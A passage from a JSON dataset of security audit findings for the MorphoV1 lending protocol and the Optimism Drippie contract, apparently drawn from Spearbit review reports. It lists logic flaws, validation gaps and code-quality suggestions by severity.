granted that the amount specified by the user will be the amount transferred to the contract's balance, while in reality, the contract will receive less. In supplyLogic, for example, Morpho will account for the user's p2p/pool balance for the full amount but will repay/supply to the pool less than the amount accounted for.", "labels": ["Spearbit", "MorphoV1", "Severity: Medium Risk"]}, {"title": "Cannot liquidate Morpho users if no liquidity on the pool", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf", "body": "Morpho implements liquidations by repaying the borrowed asset and then withdrawing the collateral If there is no liquidity in the collateral asset pool the asset from the underlying protocol (Aave / Compound). liquidation will fail. Morpho could incur bad debt as they cannot liquidate the user. The liquidation mechanisms of Aave and Compound work differently: They allow the liquidator to seize the debtorsTokens/cTokens which can later be withdrawn for the underlying token once there is enough liquidity in the pool. Technically, an attacker could even force no liquidity on the pool by frontrunning liquidations by borrowing the entire pool amount - preventing them from being liquidated on Morpho. However, this would require significant capital as collateral in most cases.", "labels": ["Spearbit", "MorphoV1", "Severity: Medium Risk"]}, {"title": "Supplying and borrowing can recreate p2p credit lines even if p2p is disabled", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf", "body": "When supplying/borrowing the algorithm tries to reduce the deltas p2pBorrowDelta/p2pSupplyDelta by moving borrowers/suppliers back to P2P. It is not checked if P2P is enabled. This has some consequences related to when governance disables P2P and wants to put users and liquidity back on the pool through increaseDelta calls. The users could enter P2P again by supplying and borrowing.", "labels": ["Spearbit", "MorphoV1", "Severity: Medium Risk"]}, {"title": "In Compound implementation, P2P indexes can be stale", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf", "body": "The current implementation of MorphoUtils._isLiquidatable loops through all of the tokens in which the user has supplied to/borrowed from. The scope of the function is to check whether the user can be liquidated or not by verifying that debtValue > maxDebtValue. Resolving \"Compound liquidity computation uses outdated cached borrowIndex\" implies that the Compound bor- row index used is always up-to-date but the P2P issues associated with the token could still be out of date if the market has not been used recently, and the underlying Compound indexes (on which the P2P index is based) has changed a lot. As a consequence, all the functions that rely on _isLiquidatable (liquidate, withdraw, borrow) could return a wrong result if the majority of the user's balance is on the P2P balance (the problem is even more aggravated without resolving \"Compound liquidity computation uses outdated cached borrowIndex\". Let's say, for example:  Alice supplies ETH in pool  Alice supplies BAT in P2P  Alice borrows some DAI At some point in time the ETH value goes down, but the interest rate of BAT goes up. If the P2P index of BAT had been correctly up-to-date, Alice would have been still solvent, but she gets liquidated by Bob who calls liq- uidate(alice, ETH, DAI) Even by fixing \"Compound liquidity computation uses outdated cached borrowIndex\" Alice would still be liquidated because her entire collateral is on P2P and not in the pool.", "labels": ["Spearbit", "MorphoV1", "Severity: Medium Risk"]}, {"title": "Turning off an asset as collateral on Morpho-Aave still allows seizing of that collateral on Morpho and leads to liquidations", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf", "body": "The Morpho Aave deployment can set the asset to not be used as collateral for Aave's Morpho contract position. On Aave, this prevents liquidators from seizing this asset as collateral. 1. However, this prevention does not extend to users on Morpho as Morpho has not implemented this check. Liquidations are performed through a repay & withdraw combination and withdrawing the asset on Aave is still allowed. 2. When turning off the asset as collateral, the single Morpho contract position on Aave might still be over- collateralized, but some users on Morpho suddenly lose this asset as collateral (LTV becomes 0) and will be liquidated.", "labels": ["Spearbit", "MorphoV1", "Severity: Medium Risk"]}, {"title": "claimToTreasury(COMP) steals users' COMP rewards", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf", "body": "The claimToTreasury function can send a market's underlying tokens that have been accumulated in the contract to the treasury. This is intended to be used for the reserve amounts that accumulate in the contract from P2P matches. However, Compound also pays out rewards in COMP and COMP is a valid Compound market. Sending the COMP reserves will also send the COMP rewards. This is especially bad as anyone can claim COMP rewards on the behalf of Morpho at any time and the rewards will be sent to the contract. An attacker could even frontrun a claimToTreasury(cCOMP) call with a Comptroller.claimComp(morpho, [cComp]) call to sabotage the reward system. Users won't be able to claim their rewards.", "labels": ["Spearbit", "MorphoV1", "Severity: Medium Risk"]}, {"title": "Compound liquidity computation uses outdated cached borrowIndex", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf", "body": "The _isLiquidatable iterates over all user-entered markets and calls _getUserLiquidity- DataForAsset(poolToken) -> _getUserBorrowBalanceInOf(poolToken). However, it only updates the indexes of markets that correspond to the borrow and collateral assets. The _getUserBorrowBalanceInOf function computes the underlying pool amount of the user as userBorrowBalance.onPool.mul(lastPoolIndexes[_- poolToken].lastBorrowPoolIndex);. Note that lastPoolIndexes[_poolToken].lastBorrowPoolIndex is a value that was cached by Morpho and it can be outdated if there has not been a user-interaction with that market for a long time. The liquidation does not match Compound's liquidation anymore and users might not be liquidated on Morpho that could be liquidated on Compound. Liquidators would first need to trigger updates to Morpho's internal borrow indexes.", "labels": ["Spearbit", "MorphoV1", "Severity: Medium Risk"]}, {"title": "HeapOrdering.getNext returns the root node for nodes not in the list", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf", "body": "If an id does not exist in the HeapOrdering the getNext() function will return the root node uint256 rank = _heap.ranks[_id]; // @audit returns 0 as rank. rank + 1 will be the root if (rank < _heap.accounts.length) return getAccount(_heap, rank + 1).id; else return address(0);", "labels": ["Spearbit", "MorphoV1", "Severity: Low Risk"]}, {"title": "Heap only supports balances up to type(uint96).max", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf", "body": "The current heap implementation packs an address and the balance into a single storage slot which If a token has 18 decimals, the largest restricts the balance to the uint96 type with a max value of ~7.9e28. balance that can be stored will be 7.9e10. This could lead to problems with a token of low value, for example, if 1.0 tokens are worth 0.0001$, a user could only store 7_900_000$.", "labels": ["Spearbit", "MorphoV1", "Severity: Low Risk"]}, {"title": "Delta leads to incorrect reward distributions", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf", "body": "Delta describes the amount that is on the pool but still wrongly tracked as inP2P for some users. There are users that do not have their P2P balance updated to an equivalent pool balance and therefore do not earn rewards. There is now a mismatch of this delta between the pool balance that earns a reward and the sum of pool balances that are tracked in the reward manager to earn that reward. The increase in delta directly leads to an increase in rewards for all other users on the pool.", "labels": ["Spearbit", "MorphoV1", "Severity: Low Risk"]}, {"title": "When adding a new rewards manager, users already on the pool won't be earning rewards", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf", "body": "When setting a new rewards manager, existing users that are already on the pool are not tracked and won't be earning rewards.", "labels": ["Spearbit", "MorphoV1", "Severity: Low Risk"]}, {"title": "liquidationThreshold computation can be moved for gas efficiency", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf", "body": "The vars.liquidationThreshold computation is only relevant if the user is supplying this asset. Therefore, it can be moved to the if (_isSupplying(vars.userMarkets, vars.borrowMask)) branch.", "labels": ["Spearbit", "MorphoV1", "Severity: Gas Optimization"]}, {"title": "Add max approvals to markets upon market creation", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf", "body": "Approvals to the Compound markets are set on each supplyToPool function call.", "labels": ["Spearbit", "MorphoV1", "Severity: Gas Optimization"]}, {"title": "isP2PDisabled flag is not updated by setIsPausedForAllMarkets", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf", "body": "The current implementation of _setPauseStatus does not update the isP2PDisabled. When _- isPaused = false this is not a real problem because once all the flags are enabled (everything is paused), all the operations will be blocked at the root of the execution of the process. There might be cases instead where isP2PDisabled and the other flags were disabled for a market and Morpho want to enable all of them, resuming all the operations and allowing the users to continue P2P usage. In this case, Morpho would only resume operations without allowing the users to use the P2P flow. function _setPauseStatus(address _poolToken, bool _isPaused) internal { Types.MarketPauseStatus storage pause = marketPauseStatus[_poolToken]; pause.isSupplyPaused = _isPaused; pause.isBorrowPaused = _isPaused; pause.isWithdrawPaused = _isPaused; pause.isRepayPaused = _isPaused; pause.isLiquidateCollateralPaused = _isPaused; pause.isLiquidateBorrowPaused = _isPaused; // ... event emissions }", "labels": ["Spearbit", "MorphoV1", "Severity: Informational"]}, {"title": "Differences between Morpho and Aave liquidate validation logic", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf", "body": "The Morpho approach is to mimic 1:1 the logic of the underlying protocol, including all the logic and sanity checks that are done before executing a user's action. On top of the protocol's logic, Morpho has its own logic. By reviewing both logic, we have noticed that there are some differences between the logic Note: Morpho re-implements the liquidate function as a mix of  repay + supply operations on Aave executed inside _unsafeRepayLogic where needed  withdraw + borrow operations on Aave executed inside _unsafeWithdrawLogic where needed From _unsafeRepayLogic (repay + supply on pool where needed)  Because _unsafeRepayLogic internally call aave.supply the whole tx could fail in case the supplying has been disabled on Aave (isFrozen == true) for the _poolTokenBorrowed  Morpho is not checking that the Aave borrowAsset has isActive == true  Morpho do not check that remainingToRepay.rayDiv(poolIndexes[_poolToken].poolBorrowIndex) > 0. Trying to repay that amount to Aave would make the whole tx revert 16  Morpho do not check that remainingToSupply.rayDiv(poolIndexes[_poolToken].poolSupplyIndex) > 0. Trying to borrow that amount to Aave would make the whole tx revert From _unsafeWithdrawLogic (withdraw + borrow on pool where needed)  Because _unsafeWithdrawLogic internally calls aave.borrow the whole tx could fail in case the borrowing has been disabled on Aave (isFrozen == true or borrowingEnabled == false) for the _poolTokenCol- lateral  Morpho is not checking that the Aave collateralAsset has isActive == true  Morpho do not check that remainingToWithdraw.rayDiv(poolIndexes[_poolToken].poolSupplyIndex) > 0. Trying to withdraw that amount from Aave would make the whole tx revert  Morpho do not check that remainingToBorrow.rayDiv(poolIndexes[_poolToken].poolBorrowIndex) > 0. Trying to borrow that amount from Aave would make the whole tx revert More information about detailed information can be found in the discussion topic \"Differences in actions checks between Morpho and Aave\".", "labels": ["Spearbit", "MorphoV1", "Severity: Informational"]}, {"title": "Differences between Morpho and Aave repay validation logic", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf", "body": "The Morpho approach is to mimic 1:1 the logic of the underlying protocol, including all the logic and sanity checks that are done before executing a user's action. On top of the protocol's logic, Morpho has its own logic. By reviewing both logic, we have noticed that there are some differences between the logic Note: Morpho re-implement the repay function as a mix of repay + supply operations on Aave where needed  Both Aave and Morpho are not handling ERC20 token with fees on transfer  Because _unsafeRepayLogic internally call aave.supply the whole tx could fail in case the supplying has been disabled on Aave (isFrozen == true)  Morpho is not checking that the Aave market has isActive == true  Morpho do not check that remainingToRepay.rayDiv(poolIndexes[_poolToken].poolBorrowIndex) > 0. Trying to repay that amount to Aave would make the whole tx revert  Morpho do not check that remainingToSupply.rayDiv(poolIndexes[_poolToken].poolSupplyIndex) > 0. Trying to supply that amount to Aave would make the whole tx revert More information about detailed information can be found in the discussion topic \"Differences in actions checks between Morpho and Aave\".", "labels": ["Spearbit", "MorphoV1", "Severity: Informational"]}, {"title": "Differences between Morpho and Aave withdraw validation logic", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf", "body": "The Morpho approach is to mimic 1:1 the logic of the underlying protocol, including all the logic and sanity checks that are done before executing a user's action. On top of the protocol's logic, Morpho has its own logic. By reviewing both logic, we have noticed that there are some differences between the logic Note: Morpho re-implement the withdraw function as a mix of withdraw + borrow operations on Aave where needed  Both Aave and Morpho are not handling ERC20 token with fees on transfer  Because _unsafeWithdrawLogic internally calls aave.borrow the whole tx could fail in case the borrowing has been disabled on Aave (isFrozen == true or borrowingEnabled == false)  Morpho is not checking that the Aave market has isActive == true  Morpho do not check that remainingToWithdraw.rayDiv(poolIndexes[_poolToken].poolSupplyIndex) > 0. Trying to withdraw that amount from Aave would make the whole tx revert  Morpho do not check that remainingToBorrow.rayDiv(poolIndexes[_poolToken].poolBorrowIndex) > 0. Trying to borrow that amount from Aave would make the whole tx revert Note 1: Aave is NOT checking that the market isFrozen. This means that users can withdraw even if the market is active but frozen More information about detailed information can be found in the discussion topic \"Differences in actions checks between Morpho and Aave\".", "labels": ["Spearbit", "MorphoV1", "Severity: Informational"]}, {"title": "Differences between Morpho and Aave borrow validation logic", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf", "body": "The Morpho approach is to mimic 1:1 the logic of the underlying protocol, including all the logic and sanity checks that are done before executing a user's action. On top of the protocol's logic, Morpho has its own logic. By reviewing both logic, we have noticed that there are some differences between the logics Note: Morpho re-implement the borrow function as a mix of withdraw + borrow operations on Aave where needed  Both Aave and Morpho are not handling ERC20 token with fees on transfer  Morpho is not checking that the Aave market has isFrozen == false (check done by Aave on the borrow operation), users could be able to borrow in P2P even if the borrow is paused on Aave (isFrozen == true) because Morpho would only call the aave.withdraw (where the frozen flag is not checked)  Morpho do not check if market is active (would borrowingEnabled == false if market is not active?)  Morpho do not check if market is frozen (would borrowingEnabled == false if market is not frozen?)  Morpho do not check that healthFactor > GenericLogic.HEALTH_FACTOR_LIQUIDATION_THRESHOLD  Morpho do not check that remainingToBorrow.rayDiv(poolIndexes[_poolToken].poolBorrowIndex) > 0. Trying to borrow that amount from Aave would make the whole tx revert More information about detailed information can be found in the discussion topic \"Differences in actions checks between Morpho and Aave\".", "labels": ["Spearbit", "MorphoV1", "Severity: Informational"]}, {"title": "Differences between Morpho and Aave supply validation logic", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf", "body": "The Morpho approach is to mimic 1:1 the logic of the underlying protocol, including all the logic and sanity checks that are done before executing a user's action. On top of the protocol's logic, Morpho has its own logic. By reviewing both logic, we have noticed that there are some differences between the logics Note: Morpho re-implement the supply function as a mix of repay + supply operations on Aave where needed  Both Aave and Morpho are not handling ERC20 token with fees on transfer  Morpho is not checking that the Aave market has isFrozen == false, users could be able to supply in P2P even if the supply is paused on Aave (isFrozen == true) because Morpho would only call the aave.repay (where the frozen flag is not checked)  Morpho is not checking if remainingToSupply.rayDiv( poolIndexes[_poolToken].poolSupplyIndex ) === 0. Trying to supply that amount to Aave would make the whole tx revert 19 More information about detailed information can be found in the discussion topic \"Differences in actions checks between Morpho and Aave\".", "labels": ["Spearbit", "MorphoV1", "Severity: Informational"]}, {"title": "Morpho should avoid creating a new market when the underlying Aave market is frozen", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf", "body": "In the current implementation of Aave MorphoGovernance.createMarket the function is only check- ing if the AToken is in active state. Morpho should also check if the AToken is not in a frozen state. When a market is frozen, many operations on the Aave side will be prevented (reverting the transaction).", "labels": ["Spearbit", "MorphoV1", "Severity: Informational"]}, {"title": "Differences between Morpho and Compound liquidate validation logic", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf", "body": "The Morpho approach is to mimic 1:1 the logic of the underlying protocol, including all the logic and sanity checks that are done before executing a user's action. On top of the protocol's logic, Morpho has its own logic. Note: Morpho liquidation does not directly call compound.liquidate but acts as a repay + withdraw operation. By reviewing both logic, we have noticed that there are some differences between the logic  Morpho does not check Compound seizeGuardianPaused because it is not implementing a \"real\" liquidate on compound, but it's emulating it as a \"repay\" + \"withdraw\".  Morpho should anyway monitor off-chain when the value of seizeGuardianPaused changes to true. Which are the scenarios for which Compound decides to block liquidations (across all cTokens)? When this happens, is Compound also pausing all the other operations?  [Open question] Should Morpho pause liquidations when the seizeGuardianPaused is true?  Morpho is not reverting if msg.sender === borrower  Morpho does not check if _amount > 0  Compound revert if amountToSeize > userCollateralBalance, Morpho does not revert and instead uses min(amountToSeize, userCollateralBalance) 20 More information about detailed information can be found in the discussion topic \"Differences in actions checks between Morpho and Aave\".", "labels": ["Spearbit", "MorphoV1", "Severity: Informational"]}, {"title": "repayLogic in Compound PositionsManagershould revert if toRepay is equal to zero", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf", "body": "The current implementation of repayLogic is correctly reverting if _amount == 0 but is not reverting if toRepay == 0. The value inside toRepay is given by the min value between _getUserBorrowBalanceInOf(_- poolToken, _onBehalf) and _amount. If the _onBehalf user has zero debt, toRepay will be initialized with zero.", "labels": ["Spearbit", "MorphoV1", "Severity: Informational"]}, {"title": "Differences between Morpho and Compound supply validation logic", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf", "body": "The Morpho approach is to mimic 1:1 the logic of the underlying protocol, including all the logic and sanity checks that are done before executing a user's action. On top of the protocol's logic, Morpho has its own logic. By reviewing both logic, we have noticed that there are some differences between them;  Compound is handling ERC20 tokens that could have transfer fees, Morpho is not doing it right now, see\"ERC20 with transfer's fee are not handled by PositionManager\".  Morpho is not checking if the underlying Compound market has been paused for the supply action (see mintGuardianPaused[token]). This means that even if the Compound supply is paused, Morpho could allow users to supply in the P2P.  Morpho is not checking if the market on both Morpho and Compound has been deprecated. If the deprecation flag is intended to be true for a market that will be removed in the next future, probably Morpho should not allow users to provide collateral for such a market. More information about detailed information can be found in the discussion topic \"Differences in actions checks between Morpho and Compound\".", "labels": ["Spearbit", "MorphoV1", "Severity: Informational"]}, {"title": "Consider creating a documentation that covers all the Morpho own flags, lending protocol's flags and how they interact/override each other", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf", "body": "Both Morpho and Aave/Compound have their own flags to check before allowing a user to interact with the protocols. Usually, Morpho has decided to follow the logic to map 1:1 the implementation of the underlying protocol validation. There are some examples also where Morpho has decided to override some of their own internal flags For example, in the Aave aave-v2/ExitPositionsManager.liquidateLogic even if a Morpho market has been flagged as \"deprecated\" (user can be liquidated without being insolvent) the liquidator would not be able to liquidate the user if the liquidation logic has been paused.", "labels": ["Spearbit", "MorphoV1", "Severity: Informational"]}, {"title": "Missing natspec or typos in natspec", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf", "body": "- Updated the natspec updateP2PIndexes replacing \"exchangeRatesStored()\" with \"exchangeRate- Stored()\"  Updated the natspec _updateP2PIndexes replacing \"exchangeRatesStored()\" with \"exchangeRateStored()\"  Updated the natspec for event MarketCreated replacing \"_poolToken\" with \"_p2pIndexCursor\"", "labels": ["Spearbit", "MorphoV1", "Severity: Informational"]}, {"title": "Removed unused \"named\" return parameters from functions", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf", "body": "Some functions in the codebase are defining \"named\" functions parameter that are not used explicitly inside the code. This could lead to future changes to return wrong values if the \"explicit return\" statement is removed and the function returns the \"default\" values (based on the variable type) of the \"named\" parameter.", "labels": ["Spearbit", "MorphoV1", "Severity: Informational"]}, {"title": "Consider merging the code of CompoundMath libraries and use only one", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf", "body": "The current codebase uses libraries/CompoundMath.sol but there's already an existing solidity library with the same name inside the package @morpho-dao/morpho-utils For better code clarity, consider merging those two libraries and only importing the one from the external pack- age. Be aware that the current implementation inside the @morpho-dao/morpho-utils CompoundMath mul and div function uses low-level yul and should be tested, while the library used right now in the code use \"high level\" solidity. the", "labels": ["Spearbit", "MorphoV1", "Severity: Informational"]}, {"title": "Consider reverting the creation of a deprecated market in Compound", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf", "body": "Compound has a mechanism that allows the Governance to set a specific market as \"deprecated\". Once a market is deprecated, all the borrows can be liquidated without checking whether the user is solvent or not. Compound currently allows users to enter (to supply and borrow) a market. In the current version of MorphoGovernance.createMarket, Morpho governance is not checking whether a market is already deprecated on compound before entering it and creating a new Morpho-market. This would allow a Morpho user to possibly supply or borrow on a market that has been already deprecated by compound.", "labels": ["Spearbit", "MorphoV1", "Severity: Informational"]}, {"title": "Document HeapOrdering", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf", "body": "Morpho uses a non-standard Heap implementation for their Aave P2P matching engine. The im- plementation only correctly sorts _maxSortedUsers / 2 instead of the expected _maxSortedUsers. Once the _maxSortedUsers is reached, it halves the size of the heap, cutting the last level of leaves of the heap. This is done because a naive implementation that would insert new values at _maxSortedUsers (once the heap is full) and shift them up, then decrease the size to _maxSortedUsers - 1 again, would end up concentrating all new values on the same single path from the leaf to the root node. Cutting off the last level of nodes of the heap is a heuristic to remove low-value nodes (because of the heap property) while at the same time letting new values be shifted up from different leaf locations. In the end, the goal this tries to achieve is that more high-value nodes are stored in the heap and can be used for the matching engine.", "labels": ["Spearbit", "MorphoV1", "Severity: Informational"]}, {"title": "Consider removing the Aave-v2 reward management logic if it is not used anymore", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf", "body": "If the current aave-v2 reward program has ended and the Aave protocol is not re-introducing it anytime soon (if not at all) consider removing the code that currently is handling all the logic behind claiming rewards from the Aave lending pool for the supplied/borrow assets. Removing that code would make the codebase cleaner, reduce the attack surface and possibly revert in case some of the state variables are incorrectly miss configured (rewards management on Morpho is activated but Aave is not distributing rewards anymore).", "labels": ["Spearbit", "MorphoV1", "Severity: Informational"]}, {"title": "Avoid shadowing state variables", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf", "body": "Shadowing state or global variables could lead to potential bugs if the developer does not treat them carefully. To avoid any possible problem, every local variable should avoid shadowing a state or global variable name.", "labels": ["Spearbit", "MorphoV1", "Severity: Informational aave-"]}, {"title": "Governance setter functions do not check current state before updates", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf", "body": "In MorphoGovernance.sol, many of the setter functions allow the state to be changed even if it is already set to the passed-in argument. For example, when calling setP2PDisabled, there are no checks to see if the _poolToken is already disabled, or does not allow unnecessary state changes.", "labels": ["Spearbit", "MorphoV1", "Severity: Informational"]}, {"title": "Emit event for amount of dust used to cover withdrawals", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf", "body": "Consider emitting an event that includes the amount of dust that was covered by the contract balance. A couple of ways this could be used:  Trigger an alert whenever it exceeds a certain threshold so you can inspect it, and pause if a bug is found or a threshold is exceeded.  Use this value as part of your overall balance accounting to verify everything adds up.", "labels": ["Spearbit", "MorphoV1", "Severity: Informational"]}, {"title": "Break up long functions into smaller composable functions", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf", "body": "A few functions are 100+ lines of code which makes it more challenging to initially grasp what the function is doing. You should consider breaking these up into smaller functions which would make it easier to grasp the logic of the function, while also enabling you to easily unit test the smaller functions.", "labels": ["Spearbit", "MorphoV1", "Severity: Informational"]}, {"title": "Remove unused struct members", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf", "body": "The HealthFactorVars struct contains three attributes, but only the userMarkets attribute is ever set or used. These should be removed to increase code readability.", "labels": ["Spearbit", "MorphoV1", "Severity: Informational"]}, {"title": "Remove unused struct", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf", "body": "There is an unused struct BorrowAllowedVars. This should be removed to improve code readability.", "labels": ["Spearbit", "MorphoV1", "Severity: Informational"]}, {"title": "No validation check on prices fetched from the oracle", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf", "body": "Currently in the liquidateLogic function when fetching the borrowedTokenPrice and collateral- Price from the oracle, the return value is not validated. This is due to the fact that the underlying protocol does not do this check either, but the fact that the underlying protocol does not do validation should not deter Morpho from performing validation checks on prices fetched from oracles. Also, this check is done in the Compound PositionsManager.sol here so for code consistency, it should also be done in Aave-v2.", "labels": ["Spearbit", "MorphoV1", "Severity: Informational"]}, {"title": "onBehalf argument can be set as the Morpho protocols address", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf", "body": "When calling the supplyLogic function, currently the _onBehalf argument allows a user to supply funds on behalf of the Morpho protocol itself. While this does not seem exploitable, it can still be a cause for user error and should not be allowed.", "labels": ["Spearbit", "MorphoV1", "Severity: Informational"]}, {"title": "maxSortedUsers has no upper bounds validation and is not the same in Compound/Aave-2", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf", "body": "In MorphoGovernance.sol, the maxSortedUsers function has no upper bounds limit put in place. The maxSortedUsers is the number of users to sort in the data structure. Also, while this function has the MaxSorte- dUsersCannotBeZero() check in Aave-v2, the Compound version is missing this same error check.", "labels": ["Spearbit", "MorphoV1", "Severity: Informational"]}, {"title": "Consider adding the compound revert error code inside Morpho custom error to better track the revert reason", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf", "body": "On Compound, when an error condition occurs, usually (except in extreme cases) the transaction is not reverted, and instead an error code (code !== 0) is returned. Morpho correctly reverts with a custom error when this happens, but is not reporting the error code returned by Compound. By tracking, as an event parameter, the error code, Morpho could better monitor when and why interactions with Compound are failing.", "labels": ["Spearbit", "MorphoV1", "Severity: Informational"]}, {"title": "liquidationThreshold variable name can be misleading", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf", "body": "The liquidationThreshold name in Aave is a percentage. The values.liquidationThreshold variable used in Morpho's _getUserHealthFactor is in \"value units\" like debt: values.liquidationThreshold = assetCollateralValue.percentMul(assetData.liquidationThreshold);.", "labels": ["Spearbit", "MorphoV1", "Severity: Informational"]}, {"title": "Users can be liquidated on Morpho at any time when the deprecation flag is set by governance", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf", "body": "Governance can set a deprecation flag on Compound and Aave markets, and users on this mar- ket can be liquidated by anyone even if they're sufficiently over-collateralized. Note that this deprecation flag is independent of Compound's own deprecation flags and can be applied to any market.", "labels": ["Spearbit", "MorphoV1", "Severity: Informational"]}, {"title": "Refactor _computeP2PIndexes to use InterestRateModel's functions", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf", "body": "The InterestRatesManager contracts' _computeP2PIndexes functions currently reimplement the interest rate model from the InterestRatesModel functions.", "labels": ["Spearbit", "MorphoV1", "Severity: Informational"]}, {"title": "Permitting Multiple Drip Calls Per Block", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/OptimismDrippie-Spearbit-Security-Review.pdf", "body": "state.config.interval is 0. We are currently unaware of use cases where this is desirable. The inline comments correctly note that reentrancy is possible and permitted when Reentrancy is one risk, flashbot bundles are a similar risk where the drip may be called multiple times by the same actor in a single block. A malicious actor may abuse this ability, especially if interval is misconfigured as 0 due to JavaScript type coercion. A reentrant call or flashbot bundle may be used to frontrun an owner attempting to archive a drip or attempting to withdraw assets.", "labels": ["Spearbit", "OptimismDrippie", "Severity: Medium Risk"]}, {"title": "Version Bump to Latest", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/OptimismDrippie-Spearbit-Security-Review.pdf", "body": "During the review, a new version of solidity was released with an important bugfix.", "labels": ["Spearbit", "OptimismDrippie", "Severity: Low Risk"]}, {"title": "DOS from External Calls in Drippie.executable / Drippie.drip", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/OptimismDrippie-Spearbit-Security-Review.pdf", "body": "In both the executable and drip (which also calls executable) functions, the Drippie contract interacts with some external contract via low-level calls. The external call could revert or fail with an Out of Gas exception causing the entire drip to fail. The severity is low beacuse in the case where a drip reverts due to a misconfigured or malicious dripcheck or target, the drip can still be archived and a new one can be created by the owner.", "labels": ["Spearbit", "OptimismDrippie", "Severity: Low Risk"]}, {"title": "Use call.value over transfer in withdrawETH", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/OptimismDrippie-Spearbit-Security-Review.pdf", "body": "transfer is no longer recommended as a default due to unpredictable gas cost changes in future evm hard forks (see here for more background.) While useful to use transfer in some cases (such as sending to EOA or contract which does not process data in the fallback or receiver functions), this particular contract does not benefit: withdrawETH is already owner gated and is not at risk of reentrancy as owner already has permission to drain the contracts ether in a single call should they choose.", "labels": ["Spearbit", "OptimismDrippie", "Severity: Low Risk"]}, {"title": "Input Validation Checks for Drippie.create", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/OptimismDrippie-Spearbit-Security-Review.pdf", "body": "Drippie.create does not validate input potentially leading to unintended results. The function should check:  _name is not an empty string to avoid creating drip that would be able to read on frontend UI.  _config.dripcheck should not be address(0) otherwise executable will always revert.  _config.actions.length should be at least one (_config.actions.length > 0) to prevent creating drips that do nothing when executed.  DripAction.target should not be address(0) to prevent burning ETH or interacting with the zero address during drips execution.", "labels": ["Spearbit", "OptimismDrippie", "Severity: Low Risk"]}, {"title": "Ownership Initialization and Transfer Safety on Owned.setOwner", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/OptimismDrippie-Spearbit-Security-Review.pdf", "body": "Consider the following scenarios.  Scenario 1 Drippie allows the owner to be both initialized and set to address(0). If this scenario happens nobody will be able to manage the Drippie contract, thus preventing 